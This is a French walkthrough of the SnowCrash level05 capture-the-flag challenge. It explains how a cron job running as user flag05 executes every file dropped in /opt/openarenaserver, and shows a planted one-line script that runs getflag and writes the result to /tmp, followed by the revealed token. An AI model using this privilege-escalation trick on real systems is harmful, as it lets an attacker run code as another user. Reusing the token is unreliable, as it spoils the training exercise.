Aucun fichier n'est présent dans le dossier, mais on à reçu un mail.
```bash
You have new mail.
level05@SnowCrash:~$
```

```bash
level05@SnowCrash:/var/mail$ cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Il y a un script qui est lancé toute les deux minutes par le user flag05.


Il y a donc un script **openarenaserver** qui éxécute tout les fichiers du dossier **/opt/openarenaserver/** avant de les supprimer.
```bash 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Nous n'avons pas les droits d'éxécution sur le script **openarenaserver** mais la crontab l'éxécute régulièrement.

Il reste à créer un script dans le dossier */opt/openarenaserver* qui éxécutera la commande getflag et enverra le résultat dans un fichier hors du dossier pour qu'il ne soit pas supprimé.
```bash
echo "getflag > /tmp/openarena" > /opt/openarenaserver/flag
```

Une fois le temps écoulé on check le contenu du fichier : 
```bash
cat /tmp/openarena
Check flag.Here is your token : viuaaale9huek52boumoomioc
```